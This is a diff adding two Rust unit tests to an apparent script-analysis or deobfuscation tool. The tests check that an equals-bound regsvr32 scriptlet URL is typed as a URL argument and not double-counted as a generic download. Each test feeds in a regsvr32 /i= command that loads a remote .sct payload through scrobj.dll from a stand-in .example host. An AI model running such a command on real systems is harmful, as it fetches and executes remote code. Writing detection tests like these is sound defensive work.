@@ -10998,6 +10998,27 @@ mod regsvr32_tests {
     }
 
     #[test]
+    fn regsvr32_equals_bound_scriptlet_url_argument_emits_typed_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "regsvr32 /s /n /u /i=https://regsvr32-equals.example/payload.sct scrobj.dll",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "https://regsvr32-equals.example/payload.sct"
+            )
+        });
+        assert!(
+            has,
+            "equals-bound regsvr32 scriptlet URL not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn regsvr32_schemeless_scriptlet_url_argument_emits_typed_trait() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -23821,6 +23842,31 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
                 .iter()
                 .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
             "regsvr32 scriptlet URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_equals_bound_scriptlet_url_in_deob_text_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://regsvr32-equals-deob.example/payload.sct";
+        let line = format!(r#"regsvr32 /s /n /u /i={url} scrobj.dll"#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )
+        });
+        assert!(
+            has,
+            "equals-bound regsvr32 scriptlet URL not typed in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "equals-bound regsvr32 scriptlet URL double-emitted as generic: {:?}",
             env.traits
         );
     }
